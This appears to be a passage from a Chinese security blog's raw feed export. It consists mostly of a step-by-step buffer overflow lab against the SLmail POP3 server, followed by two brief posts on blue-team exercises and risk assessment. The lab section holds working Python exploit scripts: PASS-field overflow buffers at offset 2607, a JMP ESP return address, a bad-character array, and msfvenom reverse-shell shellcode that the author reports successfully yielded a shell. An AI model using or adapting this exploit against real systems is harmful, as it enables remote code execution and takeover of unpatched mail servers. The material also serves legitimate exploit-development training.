c1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:	</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;Fuzzing PASS with %s bytes&quot;</span> %<span class="built_in">len</span>(buffer)</span><br><span class="line">	s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line">	s.connect((<span class="string">&#x27;192.168.181.129&#x27;</span> , <span class="number">110</span>))</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;USER LWW&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;PASS&#x27;</span>+buffer+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;QUIT&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.close()</span><br><span class="line">		</span><br><span class="line"><span class="keyword">except</span>  Exception,e:</span><br><span class="line">	<span class="built_in">print</span> e	</span><br></pre></td></tr></table></figure>

<p><strong>3、记录EIP的显示值，并计算具体位置</strong></p>
<img src="/2020/05/20/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%EF%BC%88Smail%EF%BC%89/4.png" class>

<img src="/2020/05/20/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%EF%BC%88Smail%EF%BC%89/3.png" class>

<h3 id="Step-4-判断ESP存放数据长度"><a href="#Step-4-判断ESP存放数据长度" class="headerlink" title="Step 4 .判断ESP存放数据长度"></a><strong><em>Step 4 .判断ESP存放数据长度</em></strong></h3><p><strong><em>思路：</em></strong></p>
<p><strong>追加发送不同的字符，来大概计算ESP容量（是否大于400，能放下一般shellcode</strong></p>
<p><strong>实操记录：</strong></p>
<p><strong>1、重置实验环境（重启SLmail服务+ 打开Immunity Debugger）</strong></p>
<p><strong>2、buffer中追加发送“B” 和“C” 辅助寻找</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">buffer = <span class="string">&quot;A&quot;</span>*<span class="number">2607</span> + <span class="string">&quot;B&quot;</span>*<span class="number">4</span> + <span class="string">&quot;C&quot;</span>*<span class="number">800</span></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="keyword">try</span>:	</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;Fuzzing PASS with %s bytes&quot;</span> %<span class="built_in">len</span>(buffer)</span><br><span class="line">	s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line">	s.connect((<span class="string">&#x27;192.168.181.129&#x27;</span> , <span class="number">110</span>))</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;USER LWW&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;PASS&#x27;</span>+buffer+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;QUIT&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.close()</span><br><span class="line">		</span><br><span class="line"><span class="keyword">except</span>  Exception,e:</span><br><span class="line">	<span class="built_in">print</span> e	</span><br></pre></td></tr></table></figure>

<p><strong>3、Immunity Debugger 追踪  充满”C”的ESP</strong></p>
<img src="/2020/05/20/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%EF%BC%88Smail%EF%BC%89/5.png" class>

<p><strong>4、左下角的框框显示 出现“C”的首末地址，首末地址相减能大概估算ESP是否能存放一般shellcode（msf的一般300多字节）</strong></p>
<img src="/2020/05/20/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%EF%BC%88Smail%EF%BC%89/6.png" class>

<p><strong>5、打开windows自带计算器 （选程序员模式、十六进制模式）计算大小。</strong></p>
<p>​     <strong>如上步骤4的图显示，包含”C”的地址首末为 2FD和14D，相减得出1B1 。</strong></p>
<p>​     <strong>换算成十进制 为 433，所以ESP最少能放433字节。</strong></p>
<img src="/2020/05/20/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%EF%BC%88Smail%EF%BC%89/7.png" class>

<img src="/2020/05/20/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%EF%BC%88Smail%EF%BC%89/8.png" class>

<h3 id="Step-5-寻找JMP-ESP"><a href="#Step-5-寻找JMP-ESP" class="headerlink" title="Step 5.寻找JMP ESP"></a><strong><em>Step 5.寻找JMP ESP</em></strong></h3><p><strong><em>思路：</em></strong></p>
<p><strong>先使用mona 寻找无内存保护等安全机制的模块，然后在合适的模块中寻找是否存在</strong></p>
<p><strong>JMP ESP，最后记录JMP ESP地址</strong></p>
<p><strong>温馨提示：</strong></p>
<p><strong>因为程序在重新打开或在不同环境打开内存地址可能会变化，为了让缓冲区溢出漏洞能多次利用，所以要在程序自带功能</strong></p>
<p><strong>模块中寻找JMP ESP，辅助溢出后精准跳转到ESP，最后植入shellcode。</strong></p>
<p><strong>辅助工具：</strong></p>
<p><strong>（1）nasm_shell.rb（汇编语言转二进制脚本，方便在mona中寻找“JMP ESP”字样）</strong></p>
<img src="/2020/05/20/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%EF%BC%88Smail%EF%BC%89/9.png" class>

<p><strong>实操记录：</strong></p>
<p><strong>1、在Immunity Debugger最下面的框输入：!mona modules</strong></p>
<img src="/2020/05/20/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%EF%BC%88Smail%EF%BC%89/10.png" class>

<p><strong>2、挑选合适的模块，需要观察参数如下：</strong></p>
<p>​    <strong>Rebase：关机后内存地址是否会变 （选False）</strong></p>
<p>​    <strong>SafeSEH：ASLR、NxCompat：都是内存保护机制  （选False ）</strong></p>
<p>   <strong>OS DLL ：系统动态链接库  （选True）</strong></p>
<img src="/2020/05/20/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%EF%BC%88Smail%EF%BC%89/11.png" class>

<p><strong>3、查询合适模块否存在JMP ESP ,并记录其地址（该实验发现SLMFC.dll 存在JMP ESP，  记录其中一个模块的 JMP ESP地址为5F4B41E3）</strong></p>
<img src="/2020/05/20/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%EF%BC%88Smail%EF%BC%89/12.png" class>


<h3 id="Step-6-测试跳转"><a href="#Step-6-测试跳转" class="headerlink" title="Step 6. 测试跳转"></a><strong><em>Step 6. 测试跳转</em></strong></h3><p><strong><em>思路：</em></strong></p>
<p><strong>填充EIP后 发送 JMP ESP地址，观察是否跳转成功</strong></p>
<p><strong>实操记录：</strong></p>
<p><strong>1、将原JMP ESP地址  5F4B41E3  改写为 \xe3\x41\x4b\x5f   后发送，发现跳转成功</strong></p>
<p>​     <strong>并在ESP填了8个”C”</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">buffer = <span class="string">&quot;A&quot;</span>*<span class="number">2607</span> + <span class="string">&quot;\xe3\x41\x4b\x5f&quot;</span> + <span class="string">&quot;C&quot;</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:	</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;Fuzzing PASS with %s bytes&quot;</span> %<span class="built_in">len</span>(buffer)</span><br><span class="line">	s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line">	s.connect((<span class="string">&#x27;192.168.181.129&#x27;</span> , <span class="number">110</span>))</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;USER LWW&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;PASS&#x27;</span>+buffer+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;QUIT&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.close()</span><br><span class="line">		</span><br><span class="line"><span class="keyword">except</span>  Exception,e:</span><br><span class="line">	<span class="built_in">print</span> e	</span><br></pre></td></tr></table></figure>

<img src="/2020/05/20/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%EF%BC%88Smail%EF%BC%89/13.png" class>


<h3 id="Step-7-寻找坏字符"><a href="#Step-7-寻找坏字符" class="headerlink" title="Step 7. 寻找坏字符"></a><strong><em>Step 7. 寻找坏字符</em></strong></h3><p><strong><em>思路：</em></strong></p>
<p><strong>通过发送0x00 到 0xff  256个字符，然后在 Immunity Debugger 观察哪个读取有误</strong></p>
<p><strong>实操记录：</strong></p>
<p><strong>1.发送256个 hex字符</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">badchar=(</span><br><span class="line"><span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot;</span></span><br><span class="line"><span class="string">&quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;</span></span><br><span class="line"><span class="string">&quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;</span></span><br><span class="line"><span class="string">&quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;</span></span><br><span class="line"><span class="string">&quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;</span></span><br><span class="line"><span class="string">&quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;</span></span><br><span class="line"><span class="string">&quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;</span></span><br><span class="line"><span class="string">&quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;</span></span><br><span class="line"><span class="string">&quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;</span></span><br><span class="line"><span class="string">&quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;</span></span><br><span class="line"><span class="string">&quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\x00&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">buffer = <span class="string">&quot;A&quot;</span>*<span class="number">2607</span>+<span class="string">&quot;B&quot;</span>*<span class="number">4</span>+badchar</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:	</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;Fuzzing PASS with %s bytes&quot;</span> %<span class="built_in">len</span>(buffer)</span><br><span class="line">	s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line">	s.connect((<span class="string">&#x27;192.168.181.129&#x27;</span> , <span class="number">110</span>))</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;USER LWW&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;PASS&#x27;</span>+buffer+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;QUIT&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.close()</span><br><span class="line"><span class="keyword">except</span>  Exception,e:</span><br><span class="line">	<span class="built_in">print</span> e</span><br></pre></td></tr></table></figure>

<p><strong>2、在 Immunity Debugger 观察发现存在 \x00  \x0a  \x0d  三个坏字符</strong></p>
<img src="/2020/05/20/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%EF%BC%88Smail%EF%BC%89/14.png" class>



<h3 id="Step-8-构造shellcode并利用"><a href="#Step-8-构造shellcode并利用" class="headerlink" title="Step 8. 构造shellcode并利用"></a><strong><em>Step 8. 构造shellcode并利用</em></strong></h3><p><strong><em>思路：</em></strong></p>
<p><strong>利用msfvenom生成shellcode</strong></p>
<p><strong>实操记录：</strong></p>
<p><strong>（1）查询合适payload：</strong></p>
<img src="/2020/05/20/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%EF%BC%88Smail%EF%BC%89/15.png" class>

<p><strong>（2） 生成shellcode：  使用-b去除坏字符、 -f 定义输出格式、EXITFUN=thread   稳定会话</strong></p>
<img src="/2020/05/20/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%EF%BC%88Smail%EF%BC%89/16.png" class>

<p><em>（3）构造并发送: 加上8个 \x90  ，是防止跳转后覆盖shellcode</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line"><span class="string">&quot;\xbe\x1d\x97\x35\xb0\xd9\xf7\xd9\x74\x24\xf4\x5d\x33\xc9\xb1&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\x31\x75\x12\x03\x75\x12\x83\xd8\x93\xd7\x45\x1e\x73\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xa6\xde\x84\xfa\x2f\x3b\xb5\x3a\x4b\x48\xe6\x8a\x1f\x1c\x0b&quot;</span></span><br><span class="line"><span class="string">&quot;\x60\x4d\xb4\x98\x04\x5a\xbb\x29\xa2\xbc\xf2\xaa\x9f\xfd\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\x28\xe2\xd1\x75\x10\x2d\x24\x74\x55\x50\xc5\x24\x0e\x1e\x78&quot;</span></span><br><span class="line"><span class="string">&quot;\xd8\x3b\x6a\x41\x53\x77\x7a\xc1\x80\xc0\x7d\xe0\x17\x5a\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x22\x96\x8f\x5c\x6b\x80\xcc\x59\x25\x3b\x26\x15\xb4\xed\x76&quot;</span></span><br><span class="line"><span class="string">&quot;\xd6\x1b\xd0\xb6\x25\x65\x15\x70\xd6\x10\x6f\x82\x6b\x23\xb4&quot;</span></span><br><span class="line"><span class="string">&quot;\xf8\xb7\xa6\x2e\x5a\x33\x10\x8a\x5a\x90\xc7\x59\x50\x5d\x83&quot;</span></span><br><span class="line"><span class="string">&quot;\x05\x75\x60\x40\x3e\x81\xe9\x67\x90\x03\xa9\x43\x34\x4f\x69&quot;</span></span><br><span class="line"><span class="string">&quot;\xed\x6d\x35\xdc\x12\x6d\x96\x81\xb6\xe6\x3b\xd5\xca\xa5\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x1a\xe7\x55\xa4\x34\x70\x26\x96\x9b\x2a\xa0\x9a\x54\xf5\x37&quot;</span></span><br><span class="line"><span class="string">&quot;\xdc\x4e\x41\xa7\x23\x71\xb2\xee\xe7\x25\xe2\x98\xce\x45\x69&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\xee\x93\x3e\x08\x40\x4c\xff\xf8\x20\x3c\x97\x12\xaf\x63&quot;</span></span><br><span class="line"><span class="string">&quot;\x87\x1d\x65\x0c\x22\xe4\xee\xf3\x1b\x53\x67\x9b\x59\x9b\x6d&quot;</span></span><br><span class="line"><span class="string">&quot;\xef\xd7\x7d\xe7\x1f\xbe\xd6\x90\x86\x9b\xac\x01\x46\x36\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x02\xcc\xb5\x2e\xcc\x25\xb3\x3c\xb9\xc5\x8e\x1e\x6c\xd9\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x36\xf2\x48\xa3\xc6\x7d\x71\x7c\x91\x2a\x47\x75\x77\xc7\xfe&quot;</span></span><br><span class="line"><span class="string">&quot;\x2f\x65\x1a\x66\x17\x2d\xc1\x5b\x96\xac\x84\xe0\xbc\xbe\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\xe8\xf8\xea\x0c\xbf\x56\x44\xeb\x69\x19\x3e\xa5\xc6\xf3\xd6&quot;</span></span><br><span class="line"><span class="string">&quot;\x30\x25\xc4\xa0\x3c\x60\xb2\x4c\x8c\xdd\x83\x73\x21\x8a\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x0c\x5f\x2a\xeb\xc7\xdb\x5a\xa6\x45\x4d\xf3\x6f\x1c\xcf\x9e&quot;</span></span><br><span class="line"><span class="string">&quot;\x8f\xcb\x0c\xa7\x13\xf9\xec\x5c\x0b\x88\xe9\x19\x8b\x61\x80&quot;</span></span><br><span class="line"><span class="string">&quot;\x32\x7e\x85\x37\x32\xab&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#buffer = &quot;A&quot;*2607 + &quot;\x8f\x35\x4a\x5f&quot; + &quot;\x90&quot;*8 + shellcode</span></span><br><span class="line">buffer = <span class="string">&quot;A&quot;</span>*<span class="number">2607</span> + <span class="string">&quot;\xe3\x41\x4b\x5f&quot;</span> + <span class="string">&quot;\x90&quot;</span>*<span class="number">8</span> + shellcode</span><br><span class="line">	</span><br><span class="line"><span class="keyword">try</span>:	</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;Fuzzing PASS with %s bytes&quot;</span> %<span class="built_in">len</span>(buffer)</span><br><span class="line">	s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line">	s.connect((<span class="string">&#x27;192.168.181.129&#x27;</span> , <span class="number">110</span>))</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;USER LWW&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;PASS&#x27;</span>+buffer+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;QUIT&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.close()</span><br><span class="line">		</span><br><span class="line"><span class="keyword">except</span>  Exception,e:</span><br><span class="line">	<span class="built_in">print</span> e	</span><br></pre></td></tr></table></figure>

<p><strong>（4）本地监听，成功反弹shell</strong></p>
<img src="/2020/05/20/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%EF%BC%88Smail%EF%BC%89/17.png" class>]]></content>
      <categories>
        <category>安全实验</category>
      </categories>
  </entry>
  <entry>
    <title>蓝队一般套路</title>
    <url>/2020/08/24/%E8%93%9D%E9%98%9F%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><strong><em>0x00 前言</em></strong></h2><p>   <strong><em>近期参与了几个攻防演练，想趁热打铁记点东西~</em></strong></p>
<h2 id="0x01-基本了解"><a href="#0x01-基本了解" class="headerlink" title="0x01 基本了解"></a><strong><em>0x01 基本了解</em></strong></h2><p><strong><em>蓝队以参演单位现有防护运营体系为基础， 应对实战攻防组建一支防守队伍。主要负责前期安全、 检查、整改与加固，演练期间网络安全监测、预警、 分析、验证、处置，后期复盘总结现有防护工作中不 足之处，为后期常态化防护工作提供优化依据。</em></strong></p>
<h2 id="0x02-常规角色与分工情况"><a href="#0x02-常规角色与分工情况" class="headerlink" title="0x02  常规角色与分工情况"></a><strong><em>0x02  常规角色与分工情况</em></strong></h2><p><strong><img src="/2020/08/24/%E8%93%9D%E9%98%9F%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/2.png" class></strong></p>
<h2 id="0x03-一般实施思路"><a href="#0x03-一般实施思路" class="headerlink" title="0x03 一般实施思路"></a><strong><em>0x03 一般实施思路</em></strong></h2><p> <strong><img src="/2020/08/24/%E8%93%9D%E9%98%9F%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/1.png" class></strong></p>
<h2 id="0x04-一些体会"><a href="#0x04-一些体会" class="headerlink" title="0x04 一些体会"></a><strong><em>0x04 一些体会</em></strong></h2><p><strong><em>上面讲了一些介绍，提了点思路，下面讲下体会~</em></strong></p>
<p><strong><em>1、对外暴露资产及弱口令的梳理非常关键。</em></strong></p>
<p><strong><em>2、监测设备能不能”打”很关键。</em></strong></p>
<p><strong><em>3、多做能向客户体现价值的活（汇报、提建议），脏活累活给友商~~</em></strong></p>
]]></content>
      <categories>
        <category>技战法</category>
      </categories>
  </entry>
  <entry>
    <title>风险评估的一般套路~</title>
    <url>/2020/07/12/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E7%9A%84%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><strong><em>0x00 前言</em></strong></h2><p>​     <strong><em>风险评估是组织用于确定信息安全需求的重要方法，建设信息安全管理体系的必要途径，是作为信息安全管理者的必备能力， 希望对大家了解或实施有所帮助~</em></strong></p>
<h2 id="0x01-风险评估是啥？"><a href="#0x01-风险评估是啥？" class="headerlink" title="0x01 风险评估是啥？"></a><strong><em>0x01 风险评估是啥？</em></strong></h2><p>​     <strong><em>信息安全风险评估是指依据有关信息安全技术与管理标准，对信息资产识别、威胁识别、脆弱性识别、风险值的计算，评估资产面临的威胁以及威胁利用脆弱性导致安全事件的可能性，并结合安全事件所涉及的资产价值来判断安全事件一旦发生对组织造成的影响。</em></strong></p>
